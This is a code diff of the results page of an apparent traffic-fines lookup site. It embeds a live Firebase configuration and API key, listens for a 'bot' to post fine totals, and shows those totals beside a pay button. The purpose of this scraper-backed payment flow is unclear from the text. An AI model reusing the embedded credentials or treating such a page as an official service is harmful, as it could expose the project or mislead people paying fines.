@@ -122,9 +122,10 @@
 
 <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-analytics-compat.js"></script>
 
 <script>
-    // نفس بيانات Firebase (jusour-qatar)
+    // بيانات Firebase الحقيقية لمشروع jusour-qatar
     const firebaseConfig = {
       apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
       authDomain: "jusour-qatar.firebaseapp.com",
@@ -137,35 +138,61 @@
     
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
+    const analytics = firebase.analytics();
 
-    // مراقبة آخر طلب تم إرساله لجلب النتيجة فور تحديثها من البوت
+    // استرجاع معرف الطلب من الجلسة
+    const currentOrderId = sessionStorage.getItem("last_order_id");
+
     function listenForResults() {
-        db.collection("orders")
-          .orderBy("timestamp", "desc")
-          .limit(1)
-          .onSnapshot((querySnapshot) => {
-            querySnapshot.forEach((doc) => {
+        if (!currentOrderId) {
+            console.error("No active order ID found");
+            return;
+        }
+
+        // مراقبة الطلب الحالي فقط لضمان دقة البيانات
+        db.collection("orders").doc(currentOrderId)
+          .onSnapshot((doc) => {
+            if (doc.exists) {
                 const data = doc.data();
                 
                 // إذا قام البوت بتحديث الحالة إلى "completed"
                 if (data.status === "completed") {
+                    analytics.logEvent('fines_found', { amount: data.total_fines });
                     document.getElementById("loadingCard").style.display = "none";
                     document.getElementById("resultBox").style.display = "block";
                     document.getElementById("totalAmount").innerText = data.total_fines + " AED";
-                    document.getElementById("violationDetails").innerText = "تم العثور على مخالفات مسجلة على اللوحة رقم: " + data.number;
-                } else if (data.status === "no_fines") {
+                    document.getElementById("violationDetails").innerText = "تم العثور على مخالفات مسجلة على اللوحة رقم: " + (data.number || "");
+                } 
+                // إذا لم توجد مخالفات
+                else if (data.status === "no_fines") {
+                    analytics.logEvent('no_fines_found');
                     document.getElementById("loadingCard").innerHTML = `
-                        <div style="color: var(--main-green); font-size: 50px;">✓</div>
+                        <div style="color: var(--main-green); font-size: 50px; margin-bottom:15px;">✓</div>
                         <div class="status-title">لا توجد مخالفات</div>
                         <div class="status-msg">لا توجد مخالفات مرورية مسجلة على هذه اللوحة في الوقت الحالي.</div>
-                        <button class="pay-btn" style="background:#444" onclick="window.location.href='index.php'">رجوع</button>
+                        <button class="pay-btn" style="background:#444; margin-top:20px;" onclick="window.location.href='index.php'">رجوع للرئيسية</button>
                     `;
                 }
-            });
+                // في حالة فشل البوت في جلب البيانات
+                else if (data.status === "error") {
+                    document.getElementById("loadingCard").innerHTML = `
+                        <div style="color: #e74c3c; font-size: 50px; margin-bottom:15px;">!</div>
+                        <div class="status-title">عذراً، حدث خطأ</div>
+                        <div class="status-msg">لم نتمكن من جلب البيانات حالياً، يرجى المحاولة مرة أخرى لاحقاً.</div>
+                        <button class="pay-btn" style="background:#444; margin-top:20px;" onclick="window.location.href='index.php'">رجوع</button>
+                    `;
+                }
+            }
           });
     }
 
-    listenForResults();
+    // بدء الاستماع للنتائج فور تحميل الصفحة
+    if (currentOrderId) {
+        listenForResults();
+    } else {
+        // إذا دخل الصفحة مباشرة بدون طلب، يرجع للرئيسية
+        window.location.href = "index.php";
+    }
 </script>
 </body>
 </html>
